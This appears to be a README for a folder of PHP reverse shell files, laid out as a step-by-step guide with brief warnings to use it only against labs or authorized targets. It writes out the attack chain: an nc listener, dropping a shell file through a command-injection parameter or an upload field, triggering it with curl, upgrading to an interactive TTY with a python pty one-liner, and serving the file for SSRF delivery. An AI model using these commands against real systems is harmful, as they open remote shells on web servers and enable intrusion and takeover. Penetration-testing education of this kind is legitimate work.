# HOW TO USE & TEST PHP REVERSE SHELLS (2026 expert guide, own lab / authorized targets)
> **Author:** MD MAHABUBUR RAHMAN

## The N steps
1. Get the shell file onto a location the app can execute (upload/URL/include/RCE vector) - ONLY lab targets.
2. Start listener: nc -lvnp 4444  (or socat for PTY).
3. Trigger the shell; confirm upgrade path to interactive TTY.

## Worked examples (concrete)
listener:
```
nc -lvnp 4444
if you already have command execution, sneak the file in:
via a param:   ?cmd=echo 'PASTE_B64_OR_HEREDOC' > /tmp/r.php && php /tmp/r.php
if you have write-permission http root (authorized):
POST /upload (a permitted field) with your uploaded rev shell filename.
then browse the file or URL the include:
curl -i "https://target.com/r.php"     # (only against lab / scope)
on shell prompt, upgrade:
python3 -c 'import pty;pty.spawn("/bin/bash")'
or:  httpd cheat:  python -m http.server (serve the file); if app has SSRF to your local serve.
```

## Files in this folder
- php-reverse-shell-2026-working.txt   (modernized socket shell, PHP >= 7)
- php-reverse-shell-classic.txt        (basic version)
- Maybe cURL/RCE - see folder contents.

## False positives & hygiene
- "File uploaded" != "File executed": need a 200 response that implies php-parse of your file.
- Shells die instantly = usually a < mismatch in the file content vs <?php - check your file first.
- Never run this outside scope; use the listener only on your box.
